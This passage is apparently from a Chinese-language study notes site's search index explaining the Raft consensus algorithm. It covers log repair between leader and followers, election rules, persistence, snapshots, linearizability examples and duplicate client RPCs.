<p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u6bcf\u4e2afollower\u90fd\u4f1a\u5220\u6389\u81ea\u5df1\u5c3e\u90e8\u548cleader\u4e0d\u4e00\u81f4\u7684\u65e5\u5fd7\u9879\uff0c\u5e76\u4ece\u90a3\u4e2a\u4e0d\u4e00\u81f4\u7684\u5730\u65b9\u5f00\u59cb\u63a5\u53d7leader\u7684\u65e5\u5fd7\uff0c\u4f7f\u5f97\u5176\u65e5\u5fd7\u548cleader\u540c\u6b65\u3002</p> <p>\u4e0a\u4f8b\u4e2ds2\u7684index\u4e3a12\u3001term\u4e3a4\u7684\u65e5\u5fd7\u88ab\u4e22\u6389\u4e0d\u4f1a\u6709\u4ec0\u4e48\u95ee\u9898\u5417\uff1f \u662f\u6ca1\u6709\u95ee\u9898\u7684\uff0c\u8fd9\u6761\u65e5\u5fd7\u5e76\u6ca1\u6709\u5f97\u5230\u5927\u591a\u6570\u670d\u52a1\u5668\u7684\u786e\u8ba4\uff0c\u6240\u4ee5\u4e0d\u4f1a\u88ab\u63d0\u4ea4\uff0c\u547d\u4ee4\u4e5f\u4e0d\u4f1a\u88ab\u6267\u884c\u3002\u90a3\u4e48\u6709\u6ca1\u6709\u53ef\u80fd\u5df2\u7ecf\u63d0\u4ea4\u7684\u65e5\u5fd7\u9879\uff0c\u5728\u88ab\u65b0leader\u540c\u6b65\u65f6\u88ab\u4e22\u6389\u5462\uff1f\u5b9e\u9645\u4e0aleader\u7684\u9009\u4e3e\u673a\u5236\u4f1a\u4fdd\u8bc1\uff0c\u8981\u9009\u4e3e\u4e3aleader\u7684\u8282\u70b9\u5fc5\u987b\u542b\u6709\u5168\u90e8\u7684\u5df2\u63d0\u4ea4\u7684\u65e5\u5fd7\u3002</p> <p>\u4e3a\u4ec0\u4e48\u4e0d\u9009\u62e9\u65e5\u5fd7\u6700\u957f\u7684\u670d\u52a1\u5668\u4f5c\u4e3aleader\uff1f \u5047\u8bbe\u6709\u8fd9\u6837\u4e00\u79cd\u60c5\u51b5: <pre><code>S1: 5 6 7\nS2: 5 8\nS3: 5 8\n</code></pre> \u8fd9\u79cd\u60c5\u51b5\u5982\u4f55\u4ea7\u751f\u7684\u5462\uff1f\u6bd4\u5982s1\u8d62\u5f97\u4e86term6\u7684\u9009\u4e3e\uff0c\u6b64\u65f6\u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u6761\u547d\u4ee4\uff0cs1\u8fd8\u6ca1\u6709\u6765\u5f97\u53ca\u53d1\u9001\u7ed9\u5176\u4ed6\u8282\u70b9\u65f6\u5c31\u5df2\u7ecfcrash\u4e86\u3002s1\u5f88\u5feb\u7684\u91cd\u542f\u4ee5\u540e\u8d76\u4e0a\u4e86term7\u7684\u9009\u4e3e\u5e76\u8d62\u5f97\u4e86\u8fd9\u8f6e\u9009\u4e3e\uff0c\u5b83\u4f9d\u7136\u6536\u5230\u4e00\u6761\u5ba2\u6237\u7aef\u547d\u4ee4\u540e\u8fd8\u6ca1\u53d1\u51fa\u53bb\u5c31crash\uff0c\u53ea\u662f\u8fd9\u6b21crash\u7684\u65f6\u95f4\u5f88\u957f\u3002s2\u5f53\u9009\u4e3a\u4e86leader\uff0c\u5e76\u4e14\u5e94\u8be5\u4e3aterm8(\u56e0\u4e3as1\u8981\u8d62\u5f97term7\u7684\u9009\u4e3e\uff0cs2\u6216s3\u4e2d\u6709\u4e00\u4e2a\u80af\u5b9a\u7ed9\u5b83\u6295\u7968\u4e86\uff0c\u6295\u7968\u65f6\u5b83\u7684term\u5c31\u5df2\u7ecf\u662f7\u4e86)\u3002\u6b64\u65f6s2\u63a5\u5230\u5ba2\u6237\u7aef\u6307\u4ee4\uff0c\u5e76\u4e14\u4e5f\u5df2\u53d1\u9001\u7ed9s3\uff0cs2\u548cs3\u90fd\u5c06log8\u63d0\u4ea4\u540e\u53d1\u751f\u4e86crash\uff0c\u6b64\u65f6s1\u4e5f\u91cd\u8fde\u4e86\u8fdb\u6765\u3002\u6240\u4ee5\uff0c\u7b80\u5355\u7684\u9009\u62e9\u65e5\u5fd7\u6700\u957f\u7684\u670d\u52a1\u5668s1\u4f5c\u4e3aleader\u662f\u4e0d\u5408\u9002\u7684\uff0c\u56e0\u4e3alog8\u5df2\u7ecf\u63d0\u4ea4\u4e86\uff0c\u90a3\u4e48\u65b0\u7684leader\u53ea\u80fd\u662fs2\u6216s3\u3002</p> <p>\u9009\u4e3e\u89c4\u5219\u4e0a\uff0c\u8981\u6c42\u4e86\u5019\u9009\u4eba\u7684\u6700\u540e\u65e5\u5fd7\u9879\u7684term\u66f4\u9ad8\uff0c\u6216\u8005term\u76f8\u540c\u65f6\uff0c\u548cfollower\u6bd4\u6709\u66f4\u957f\u6216\u8005\u76f8\u540c\u7684\u65e5\u5fd7\uff0cfollower\u624d\u80fd\u6295\u7968\u7ed9\u5b83\u3002\u90a3\u4e48\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0cs2\u548cs3\u4e0d\u4f1a\u6295\u7968\u7ed9s1\uff0c\u53ea\u4f1a\u76f8\u4e92\u6295\u7968\uff0c\u5176\u4e2d\u4e4b\u4e00\u8d62\u5f97\u9009\u4e3e\u3002s1\u7684log6\u548clog7\u5c06\u88ab\u4e22\u5f03\uff0c\u4e5f\u4e0d\u4f1a\u5bf9\u5ba2\u6237\u7aef\u53d1\u9001\u76f8\u5e94\u7684reply\uff0c\u5ba2\u6237\u7aef\u53d1\u73b0\u6307\u4ee4\u4e22\u5931\u540e\u4f1a\u91cd\u65b0\u53d1\u9001\u4e22\u6389\u7684\u6307\u4ee4\u3002</p> <p>\u5982\u4f55\u5feb\u901f\u7684\u540c\u6b65\u65e5\u5fd7\uff1f \u8bd5\u60f3\u4e00\u4e0b\uff0c\u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u5f53\u65b0\u7684leader\u4ea7\u751f\u9700\u8981\u548cfollower\u540c\u6b65\u65e5\u5fd7\u65f6\uff0c\u5374\u9700\u8981\u50cf\u4e4b\u524d\u90a3\u6837\u901a\u8fc7\u6bcf\u6b21RPC\u8bf7\u6c42\u5411\u4e0a\u56de\u6eda\u4e00\u4e2a\u65e5\u5fd7\u9879\u6765\u8fdb\u884c\u540c\u6b65\uff0c\u8be5\u6709\u591a\u6162\uff1f</p> <p>\u6709\u8fd9\u6837\u4e00\u79cd\u65b9\u6848\u80fd\u591f\u89e3\u51b3(\u53ef\u80fd\u8fd8\u6709\u66f4\u597d\u7684\u65b9\u6848)\uff0c\u5b83\u628a\u540c\u6b65\u5206\u4e3a\u4ee5\u4e0b\u4e09\u79cd\u60c5\u51b5: <pre><code># CASE 1:\nS1:  4  5  5\nS2:  4  6  6  6\n\n# CASE 2:\nS1:  4  4  4\nS2:  4  6  6  6\n\n# CASE 3:\nS1:  4  \nS2:  4  6  6  6\n</code></pre> leader S2\u8d62\u5f97\u4e86term6\u7684\u9009\u4e3e\uff0c\u5b83\u4ecd\u7136\u9700\u8981\u53d1\u9001<code>AppendEntries</code>\u8bf7\u6c42\uff0c\u5305\u542b<code>prevLogTerm=6</code>\u3002\u6b64\u65f6follower S1\u5982\u679c\u62d2\u7edd\u4e86\u8fd9\u6b21\u8bf7\u6c42\uff0c\u8fd8\u9700\u8981\u9644\u4e0a\u53c2\u6570<code>XTerm</code>\u8868\u793a\u51b2\u7a81\u65e5\u5fd7\u9879\u7684term\uff0c\u4ee5\u53ca<code>XIndex</code>\u8868\u793a\u8fd9\u4e2aterm\u7684\u7b2c\u4e00\u4e2aindex\uff0c<code>XLen</code>\u4e3a\u65e5\u5fd7\u7684\u957f\u5ea6\u3002</p> <p>\u5bf9\u4e8ecase1\uff0cs1\u53d1\u9001\u7684\u53c2\u6570\u5305\u542b<code>XTerm=5</code>\uff0cleader\u53d1\u73b0\u81ea\u5df1\u6ca1\u6709\u8fd9\u4e2aXTerm\uff0c\u5219\u628anextIndex\u8bbe\u4e3aXIndex\u5373\u53ef\uff1b\u5bf9\u4e8ecase2\uff0cs1\u53d1\u9001\u7684\u53c2\u6570\u5305\u542b<code>XTerm=4</code>\uff0cleader\u53d1\u73b0\u81ea\u5df1\u6709\u8fd9\u4e2aXTerm\uff0c\u5219\u628anextIndex\u8bbe\u4e3a\u81ea\u5df1\u65e5\u5fd7\u4e2d\u8be5term\u7684\u6700\u540e\u4e00\u4e2a\u65e5\u5fd7\u9879\u7684index\uff1b\u5bf9\u4e8ecase3\uff0cs1\u7684\u65e5\u5fd7\u957f\u5ea6\u8fc7\u77ed\uff0cnextIndex\u4e3aXLen\u3002</p>"},{"location":"other/raft/#_3","title":"\u6301\u4e45\u5316","text":"<p>\u5f53\u4e00\u4e2a\u670d\u52a1\u5668\u8282\u70b9\u5d29\u6e83\u4e4b\u540e\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f raft\u80fd\u591f\u7ee7\u7eed\u5de5\u4f5c\uff0c\u4f46\u5d29\u6e83\u7684\u8282\u70b9\u9700\u8981\u5c3d\u5feb\u7684\u91cd\u65b0\u52a0\u5165\u8fdb\u6765\uff0c\u5426\u5219\u66f4\u591a\u7684\u8282\u70b9\u5d29\u6e83\u76f4\u81f3\u96c6\u7fa4\u4e2d\u5927\u591a\u6570\u8282\u70b9\u90fd\u6302\u6389\u5c31\u4f1a\u5bfc\u81f4\u96c6\u7fa4\u65e0\u6cd5\u5de5\u4f5c\u3002 \u6709\u4e24\u79cd\u91cd\u65b0\u52a0\u5165\u7684\u7b56\u7565\uff0c\u8981\u4e48\u66ff\u6362\u4e3a\u4e00\u4e2a\u65b0\u7684\u670d\u52a1\u5668\uff0c\u8fd9\u9700\u8981\u4f20\u8f93\u6574\u4e2alog(\u6216\u5feb\u7167)\u7ed9\u65b0\u7684\u670d\u52a1\u5668\uff0c\u4f1a\u5f88\u6162\uff0c\u901a\u5e38\u53d1\u751f\u5728\u5d29\u6e83\u7684\u8282\u70b9\u65e0\u6cd5\u6062\u590d\uff1b\u8981\u4e48\u91cd\u65b0\u542f\u52a8\u5d29\u6e83\u7684\u670d\u52a1\u5668\uff0c\u643a\u5e26\u5fc5\u8981\u7684\u4fe1\u606f\uff0c\u91cd\u65b0\u52a0\u5165raft\u7f51\u7edc\u4e2d\u7ee7\u7eed\u5de5\u4f5c\u3002\u6211\u4eec\u5148\u6765\u8ba8\u8bba\u7b2c\u4e8c\u79cd\u7b56\u7565\u3002</p> <p>\u5982\u679c\u4e00\u4e2a\u670d\u52a1\u5668\u91cd\u542f\u540e\u91cd\u65b0\u52a0\u5165\uff0c\u54ea\u4e9b\u4fe1\u606f\u662f\u5fc5\u987b\u7684\uff1f \u6839\u636eraft\u8bba\u6587\u4e2d\u7684\u63cf\u8ff0\uff0c\u6709<code>log[]</code>,<code>currentTerm</code>,<code>votedFor</code>\u8fd9\u4e09\u4e2a\u4fe1\u606f\u662f\u5fc5\u987b\u7684\uff0c\u8fd9\u4e9b\u4fe1\u606f\u5e94\u8be5\u5b58\u50a8\u5728\u786c\u76d8\u3001SSD\u3001\u5e26\u6709\u7535\u6c60\u7684\u5185\u5b58\u7b49\u8bbe\u5907\u4e2d\uff0c\u4e14\u5728\u6bcf\u6b21\u4fee\u6539\u65f6\u90fd\u9700\u8981\u4fdd\u5b58\u4e00\u6b21\u3002 \u4e3a\u4ec0\u4e48\u9700\u8981<code>log[]</code>\uff1flog\u662fraft\u4e2d\u552f\u4e00\u7528\u6765\u8bb0\u5f55app\u72b6\u6001\u7684\uff0c\u5f53\u670d\u52a1\u5668\u91cd\u542f\u540e\u7528\u6765\u6062\u590d\u5e94\u7528\u72b6\u6001\u7684\u5c31\u662f\u5b58\u50a8\u5728log\u4e2d\u7684\u4e00\u6761\u6761\u6309\u987a\u5e8f\u6267\u884c\u7684\u547d\u4ee4\u3002\u5982\u679c\u8282\u70b9\u5c5e\u4e8e\u67d0\u6b21\u786e\u8ba4\u65e5\u5fd7\u63d0\u4ea4\u7684\u5927\u591a\u6570\u8282\u70b9\u4e4b\u4e00\uff0c\u90a3\u4e48\u91cd\u542f\u540e\u5e94\u5f53\u8bb0\u4f4f\u8fd9\u70b9\uff0c\u7528\u6765\u4fdd\u8bc1\u4efb\u4e00\u672a\u6765\u7684leader\u90fd\u80fd\u786e\u8ba4\u8fd9\u6761\u63d0\u4ea4\u7684\u65e5\u5fd7\u3002 \u4e3a\u4ec0\u4e48\u9700\u8981<code>voteFor</code>\uff1f\u9632\u6b62\u67d0\u4e2aserver\u6295\u7968\u7ed9\u5019\u9009\u4ebaA\u540e\u5d29\u6e83\u91cd\u542f\uff0c\u6b64\u65f6\u53c8\u63a5\u5230\u5019\u9009\u4ebaB\u53d1\u6765\u7684\u6295\u7968\u8bf7\u6c42\uff0c\u5bfc\u81f4\u76f8\u540cterm\u4e2d\u65e2\u6295\u7ed9\u4e86A\u53c8\u6295\u7ed9\u4e86B\uff0c\u6700\u7ec8\u53d1\u751f\u540c\u4e00\u4e2aterm\u591a\u4e2aleader\u7684\u60c5\u51b5\u3002 \u4e3a\u4ec0\u4e48\u9700\u8981<code>currentTerm</code>\uff1f\u786e\u4fddterm\u662f\u4e00\u76f4\u589e\u52a0\u7684\uff0c\u56e0\u6b64\u6bcf\u4e2aterm\u4e2d\u81f3\u591a\u6709\u4e00\u4e2aleader\uff0c\u5b83\u80fd\u68c0\u6d4b\u5230\u8fc7\u65f6\u7684leader\u548c\u5019\u9009\u4eba\u7684RPC\u6d88\u606f\u3002  </p> <p>\u4e0d\u53bb\u6301\u4e45\u5316<code>commitIndex</code>,<code>lastApplied</code>\u7b49\u4fe1\u606f\u6b63\u786e\u5417\uff1f \u8fd9\u662f\u53ef\u4ee5\u7684\uff0c\u56e0\u4e3a\u5d29\u6e83\u91cd\u542f\u5e76\u91cd\u65b0\u52a0\u5165\u96c6\u7fa4\u540e\uff0c\u4e00\u65e6\u6536\u5230\u5f53\u524dleader\u53d1\u9001\u7684<code>AppendEntries</code>\u8bf7\u6c42\uff0cleader\u5c31\u4f1a\u544a\u8bc9\u5b83\u6b63\u786e\u7684<code>commitIndex</code>\u3002\u800c<code>lastApplied</code>\u9700\u8981\u4ece0\u5f00\u59cb\uff0c\u56e0\u4e3a\u8bba\u6587\u4e2d\u7684raft\u7b97\u6cd5\u662f\u5047\u5b9a\u4e86\u5e94\u7528\u672c\u8eab\u4e0d\u4f1a\u4fdd\u5b58\u4efb\u4f55\u6301\u4e45\u5316\u72b6\u6001\uff0c\u9700\u8981\u901a\u8fc7\u91cd\u65b0\u6267\u884c\u6bcf\u6761\u65e5\u5fd7\u4e2d\u7684\u6307\u4ee4\u6765\u91cd\u65b0\u521b\u5efa\u5b83\u7684\u72b6\u6001\uff0c\u8fd9\u6837\u6548\u7387\u662f\u975e\u5e38\u4f4e\u7684\uff0c\u4f7f\u7528\u5feb\u7167\u673a\u5236\u5e76\u4ec5\u6267\u884c\u5c3e\u90e8\u7684\u4e00\u4e9b\u65e5\u5fd7\u53ef\u4ee5\u663e\u8457\u7684\u63d0\u5347\u6548\u7387\u3002</p> <p>\u6301\u4e45\u5316\u7684\u6027\u80fd\u74f6\u9888 \u6301\u4e45\u5316\u901a\u5e38\u662f\u6027\u80fd\u7684\u74f6\u9888\uff0c\u56e0\u4e3a\u4e00\u6b21\u6570\u636e\u5199\u5165\u786c\u76d8\u7684\u64cd\u4f5c\u9700\u898110ms\uff0cSSD\u4e5f\u9700\u89810.1ms\uff0c\u6240\u4ee5\u6301\u4e45\u5316\u5c31\u9650\u5236\u4e86\u6211\u4eec\u6bcf\u79d2\u949f\u53ea\u80fd\u5904\u7406100\u4e2a\u64cd\u4f5c\uff08SSD\u5219\u662f10000\u4e2a\uff0c\u53e6\u4e00\u4e2a\u74f6\u9888\u662f\u5c40\u57df\u7f51RPC\uff0c\u6bcf\u6b21\u9700\u8981\u5c0f\u4e8e1ms\u7684\u65f6\u95f4\uff09\u3002\u4e5f\u6709\u4e00\u4e9b\u65b9\u5f0f\u80fd\u591f\u89e3\u51b3\u8fd9\u4e2a\u74f6\u9888\uff0c\u4f8b\u5982\u4e00\u4e9b\u65b0\u7684\u65e5\u5fd7\u9879\u662f\u6279\u91cf\u5199\u5165\u786c\u76d8\u7684\u3001\u4f7f\u7528\u5e26\u6709\u7535\u6e90\u7684\u5185\u5b58\u8bbe\u5907\u7b49\u3002</p>"},{"location":"other/raft/#_4","title":"\u65e5\u5fd7\u538b\u7f29\u548c\u5feb\u7167","text":"<p>\u968f\u7740\u670d\u52a1\u7684\u8fd0\u884c\uff0c\u65e5\u5fd7\u4f1a\u53d8\u5f97\u8d8a\u6765\u8d8a\u5927\uff0c\u800c\u4e14\u6709\u7684\u65e5\u5fd7\u5728raft\u5c42\u662f\u591a\u6761\uff0c\u4f46\u5728\u5e94\u7528\u5c42\u53ef\u80fd\u53ea\u662f\u4e00\u6761\uff0c\u4f8b\u5982<code>x=1</code>\u3001<code>x=2</code>\u5728raft\u4e2d\u662f\u4e24\u6761\u65e5\u5fd7\uff0c\u4f46\u5728K/V\u6570\u636e\u5e93\u5e94\u7528\u4e2d\u53ea\u4f1a\u6709<code>x=2</code>\u3002\u90a3\u4e48\u5f53\u670d\u52a1\u5668\u8282\u70b9\u91cd\u542f\u6216\u8005\u6709\u65b0\u7684\u8282\u70b9\u52a0\u5165\uff0c\u91cd\u5934\u6267\u884c\u4e00\u904d\u65e5\u5fd7\u52bf\u5fc5\u4f1a\u9020\u6210\u5927\u91cf\u7684\u65f6\u95f4\u6d6a\u8d39\u3002</p> <p>\u5982\u4f55\u89e3\u51b3\uff1f \u89e3\u51b3\u65b9\u6848\u5c31\u662f\u670d\u52a1\u5668\u5e94\u7528\u5c42\u5b9a\u671f\u7684\u521b\u5efa\u5feb\u7167\uff0c\u5feb\u7167\u5c31\u662f\u4e00\u90e8\u5206\u65e5\u5fd7\u6267\u884c\u540e\u7684\u670d\u52a1\u5668\u5e94\u7528\u5c42\u72b6\u6001\u673a\uff0c\u7136\u540e\u628a\u5feb\u7167\u5b58\u50a8\u5728\u6301\u4e45\u6027\u8bbe\u5907\u4e0a(\u786c\u76d8)\uff0c\u5feb\u7167\u4f1a\u8bb0\u5f55\u6700\u540e\u4e00\u6761\u7528\u4e8e\u521b\u5efa\u5feb\u7167\u7684\u65e5\u5fd7\u7d22\u5f15\u5e76\u544a\u8bc9raft\u5c42\uff0c\u5df2\u7ecf\u7528\u4e8e\u521b\u5efa\u5feb\u7167\u7684\u65e5\u5fd7\u5c31\u53ef\u4ee5\u5728\u4efb\u610f\u65f6\u523b\u4e22\u6389\u3002</p> <p>\u670d\u52a1\u5668\u5d29\u6e83\u91cd\u542f\u4e4b\u540e\u600e\u4e48\u505a\uff1f \u91cd\u542f\u540e\u5e94\u7528\u5c42\u4ece\u786c\u76d8\u4e2d\u8bfb\u53d6\u5feb\u7167\uff0craft\u5c42\u4ece\u786c\u76d8\u4e2d\u8bfb\u53d6\u65e5\u5fd7\uff0c\u7136\u540e\u5e94\u7528\u5c42\u544a\u8bc9raft\u5c42\u6700\u540e\u4e00\u6761\u7528\u4e8e\u521b\u5efa\u5feb\u7167\u7684\u65e5\u5fd7\u7d22\u5f15\u4ee5\u907f\u514d\u91cd\u590d\u6267\u884c\u65e5\u5fd7\u4e2d\u7684\u547d\u4ee4\u3002 \u90a3\u4e48\u5c31\u6709\u4e00\u79cd\u7279\u6b8a\u60c5\u51b5\u4e86\uff0cfollower\u7684\u6700\u540e\u65e5\u5fd7\u7d22\u5f15\u662f\u53ef\u80fd\u9ad8\u4e8eleader\u7684\uff0c\u56e0\u4e3afollower\u6389\u7ebf\u4ee5\u540e\uff0cleader\u5efa\u7acb\u4e86\u5feb\u7167\u5e76\u4e22\u5f03\u4e86\u4e00\u90e8\u5206\u65e5\u5fd7\uff0c\u4e22\u5f03\u4e4b\u540eleader\u7684nextIndex[i]\u5c06\u53d8\u4e3aleader\u65e5\u5fd7\u7684\u8d77\u59cb\u4f4d\u7f6e\uff0c\u6240\u4ee5leader\u901a\u8fc7<code>AppendEntries</code>\u5df2\u7ecf\u4e0d\u80fd\u4fee\u590d\u8fd9\u79cd\u60c5\u51b5\uff0c\u56e0\u6b64\u624d\u6709\u4e86<code>InstallSnapshot</code>RPC\u8bf7\u6c42\u3002</p>"},{"location":"other/raft/#_5","title":"\u7ebf\u6027\u4e00\u81f4\u6027","text":"<p>\u5728\u4e00\u4e2a\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u6709\u5f88\u591a\u590d\u6742\u7684\u60c5\u51b5\uff0c\u6bd4\u5982\u5e76\u53d1\u3001\u590d\u5236\u3001RPC\u91cd\u4f20\u3001Leader\u53d8\u5316\u7b49\u7b49\uff0c\u5982\u4f55\u4fdd\u8bc1\u5ba2\u6237\u7aef\u7684\u8bfb\u5199\u884c\u4e3a\u662f\u6b63\u786e\u7684\uff1f\u7ebf\u6027\u4e00\u81f4\u662f\u6700\u5e38\u89c1\u7684\u3001\u6700\u76f4\u89c2\u7684\u5b9a\u4e49\uff0c\u4f7f\u4e4b\u770b\u8d77\u6765\u50cf\u5728\u5355\u4e2a\u670d\u52a1\u5668\u8fd0\u884c\u4e00\u6837\u3002</p> <p>\u90a3\u4e48\u600e\u6837\u8fbe\u6210\u7ebf\u6027\u4e00\u81f4\u6027\u5462\uff1f\u9488\u5bf9\u4e8e\u6240\u6709\u7684\u64cd\u4f5c\uff0c\u6211\u4eec\u80fd\u628a\u5b83\u4eec\u548c\u65f6\u95f4\u7ebf\u5339\u914d\u4e0a\uff0c\u5e76\u4e14\u8bfb\u53d6\u5f97\u5230\u67d0\u4e2a\u503c\u65f6\uff0c\u4e4b\u524d\u662f\u53d1\u751f\u8fc7\u8be5\u503c\u7684\u5199\u5165\u64cd\u4f5c\u800c\u6ca1\u6709\u88ab\u8986\u76d6\u6389\u7684\u3002\u4f8b\u5982:  </p> <p></p> <p><code>Wx1</code>\u8868\u793a\u5ba2\u6237\u7aefA\u5199\u5165x\u7684\u503c\u4e3a1\uff0c<code>Rx1</code>\u8868\u793a\u5ba2\u6237\u7aefB\u8bfb\u53d6x\u7684\u503c\u5f97\u52301\u3002\u5bf9\u4e8e\u67d0\u6761\u7ebf\u6bb5\uff0c\u4f8b\u5982<code>Wx1</code>\uff0c\u5b83\u7684\u8d77\u70b9\u8868\u793a\u5ba2\u6237\u7aef\u53d1\u8d77\u8bf7\u6c42\uff0c\u7ec8\u70b9\u8868\u793a\u670d\u52a1\u7aef\u8fd4\u56de\u7684\u65f6\u95f4\u70b9\uff0c\u4f46\u662f\u672c\u8eab\u7684\u8bfb\u53d6\u3001\u5199\u5165\u8fd9\u4e9b\u64cd\u4f5c\u5728\u670d\u52a1\u5668\u4e0a\u7684\u6267\u884c\u65f6\u95f4\u662f\u5f88\u77ed\u7684\uff0c\u76f8\u5bf9\u4e8e\u6574\u4e2a\u8bf7\u6c42\u53ef\u4ee5\u8ba4\u4e3a\u662f\u77ac\u95f4\u5b8c\u6210\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u662f\u5728\u65f6\u95f4\u8f74\u4e0a\u7684\u4e00\u4e2a\u70b9\uff0c\u8fd9\u4e2a\u70b9\u65e2\u53ef\u4ee5\u5728\u7ebf\u6bb5\u7684\u6700\u524d\u9762\uff0c\u4e5f\u53ef\u4ee5\u5728\u6700\u540e\u9762\u3002\u6211\u4eec\u53ef\u4ee5\u4ece\u56fe2\u4e2d\u770b\u5230x\u503c\u7684\u53d8\u5316\u3002</p> <p>\u5bf9\u4e8e\u56fe1\uff0c\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u8fd9\u6837\u4e00\u4e2a\u987a\u5e8f\uff0cWx1-&gt;Rx1-&gt;Wx2-&gt;Rx2\uff0c\u5b83\u7b26\u5408\u503c\u7684\u7ea6\u675f(\u5199\u5165\u53d1\u751f\u5728\u8bfb\u53d6\u4e4b\u524d)\uff0c\u4ee5\u53ca\u5b9e\u65f6\u64cd\u4f5c\u7684\u7ea6\u675f(\u5148\u662fWx1\u7136\u540eWx2)\uff0c\u6240\u4ee5\u5b83\u662f\u7b26\u5408\u7ebf\u6027\u4e00\u81f4\u7684\u3002\u518d\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50: <pre><code>  |-Wx1-| |-Wx2-|\n    |--Rx2--|\n              |-Rx1-|\n</code></pre> \u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u8981\u5b9e\u73b0Wx1-&gt;Rx1-&gt;Wx2-&gt;Rx2\u8fd9\u6837\u7684\u987a\u5e8f\u662f\u4e0d\u53ef\u80fd\u7684\uff0c\u56e0\u4e3a\u57fa\u4e8e\u5b9e\u65f6\u6027\u7ea6\u675f\uff0cRx2\u7ed3\u675f\u4e86\u624d\u4f1a\u53d1\u751fRx1\uff0c\u6240\u4ee5\u5b83\u662f\u975e\u7ebf\u6027\u4e00\u81f4\u7684\u3002 <pre><code>|--Wx0--|  |--Wx1--|\n            |--Wx2--|\n        |-Rx2-| |-Rx1-|\n</code></pre> \u8fd9\u4e2a\u4f8b\u5b50\u6211\u4eec\u4e5f\u80fd\u627e\u5230\u4e00\u4e2a\u987a\u5e8f\uff0cWx0-&gt;Wx2-&gt;Rx2-&gt;Wx1-&gt;Rx1\uff0c\u6240\u4ee5\u5b83\u662f\u7ebf\u6027\u4e00\u81f4\u7684\u3002 <pre><code>|--Wx0--|  |--Wx1--|\n            |--Wx2--|\nC1:     |-Rx2-| |-Rx1-|\nC2:     |-Rx1-| |-Rx2-|\n</code></pre> \u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5148\u662fWx2-&gt;C1\u7684Rx2-&gt;Wx1-&gt;C1\u7684Rx1\u548cC2\u7684Rx1\uff0c\u6b64\u65f6C2\u9700\u8981\u5f97\u5230Rx2\uff0c\u5219\u53c8\u9700\u8981Wx2\uff0c\u5f62\u6210\u4e86\u4e00\u4e2a\u5faa\u73af\uff0c\u56e0\u6b64\u5b83\u4e0d\u662f\u7ebf\u6027\u4e00\u81f4\u7684\u3002\u4e5f\u5c31\u662f\u8bf4\u5bf9\u4e8e\u670d\u52a1\u7aef\uff0c\u53ef\u4ee5\u9009\u62e9\u4efb\u4e00\u987a\u5e8f\u8fdb\u884c\u5e76\u53d1\u5199\u5165\uff0c\u4f46\u5bf9\u4e8e\u6240\u6709\u7684\u5ba2\u6237\u7aef\uff0c\u5b83\u4eec\u770b\u5230\u7684\u5199\u5165\u987a\u5e8f\u5e94\u8be5\u662f\u4e00\u81f4\u7684\uff0c\u8fd9\u70b9\u662f\u5f88\u91cd\u8981\u7684\u3002 <pre><code>|-Wx1-|\n        |-Wx2-|\n                |-Rx1-|\n</code></pre> \u8fd9\u4e2a\u4f8b\u5b50\u53ea\u6709\u4e00\u79cd\u6267\u884c\u987a\u5e8f\uff0c\u5373Wx1-&gt;Wx2-&gt;Rx1\uff0c\u4f46\u8bfb\u5230Rx1\u663e\u7136\u4e0d\u53ef\u80fd\uff0c\u6240\u4ee5\u8bf4\u660e\u8bfb\u53d6\u5fc5\u987b\u8fd4\u56de\u6700\u65b0\u7684\u6570\u636e\uff0c\u65e7\u7684\u6570\u636e\u662f\u975e\u7ebf\u6027\u4e00\u81f4\u7684\u3002 <pre><code>C1: |-Wx3-|          |-Wx4-|\nC2:          |-Rx--------------|\n</code></pre> \u73b0\u5728\u5047\u8bbeC2\u5728\u53d1\u9001\u51fa\u4e00\u4e2a\u8bfb\u53d6\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u670d\u52a1\u7aef\u56de\u590d\u7684\u6d88\u606f\u4e22\u5931\u4e86\uff0c\u8fc7\u4e86\u4e00\u6bb5\u65f6\u95f4\u5b83\u91cd\u65b0\u53d1\u9001\uff0c\u670d\u52a1\u7aef\u770b\u5230\u91cd\u590d\u7684\u8bfb\u53d6\u8bf7\u6c42\u8fd4\u56de\u4e86\u7b2c\u4e00\u6b21\u7684\u7ed3\u679c\uff0c\u6b64\u65f6Rx3\u662f\u7ebf\u6027\u5316\u7684\uff0c\u867d\u7136\u5b83\u662f\u4e00\u4e2a\u9648\u65e7\u7684\u6570\u636e\u3002</p>"},{"location":"other/raft/#rpc","title":"RPC\u91cd\u590d\u7684\u60c5\u51b5","text":"<p>\u5f53\u5ba2\u6237\u7aef\u53d1\u8d77\u7684Get/Put\u7684RPC\u8bf7\u6c42\u8d85\u65f6\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f \u5982\u679c\u670d\u52a1\u5668\u5df2\u7ecf\u6302\u6389\u4e86\u6216\u8005\u8bf7\u6c42\u4e22\u6389\u4e86\uff0c\u90a3\u4e48\u91cd\u65b0\u53d1\u9001\u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u8fd8\u6709\u60c5\u51b5\u662f\u670d\u52a1\u5668\u5df2\u7ecf\u6267\u884c\u4e86\uff0c\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u4e22\u6389\u4e86\uff0c\u8fd9\u4e2a\u65f6\u5019\u5982\u679c\u5ba2\u6237\u7aef\u91cd\u65b0\u53d1\u9001\u662f\u975e\u5e38\u5371\u9669\u7684\uff0c\u56e0\u4e3a\u53ef\u80fd\u9020\u6210\u670d\u52a1\u7aef\u6267\u884c\u4e24\u6b21\u800c\u5f97\u5230\u9519\u8bef\u7684\u7ed3\u679c\u3002</p> <p>\u5982\u4f55\u89e3\u51b3\uff1f 